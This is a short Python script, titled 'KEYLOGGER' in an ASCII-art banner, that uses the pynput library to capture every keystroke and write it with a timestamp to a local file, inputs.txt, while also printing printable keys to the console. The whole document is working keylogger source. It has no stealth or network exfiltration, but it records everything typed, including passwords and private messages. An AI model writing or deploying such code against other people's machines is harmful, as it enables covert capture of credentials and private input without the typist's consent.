import logging
from pynput import keyboard

print("██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░")
print("██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗")
print("█████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝")
print("██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗")
print("██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║")
print("╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝")


filename = "inputs.txt"


def on_press(key):
    try:
        logging.info('Key %s pressed.' % key.char)
        print('Key %s pressed.' % key.char)
    except AttributeError:
        logging.info('Special key %s pressed.' % key)

def start_keylogger():
    logging.basicConfig(filename=filename, level=logging.INFO, format='%(asctime)s: %(message)s')

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

try:

    start_keylogger()
except Exception as e:

    print(str(e))
finally:

    open(filename, 'a').close()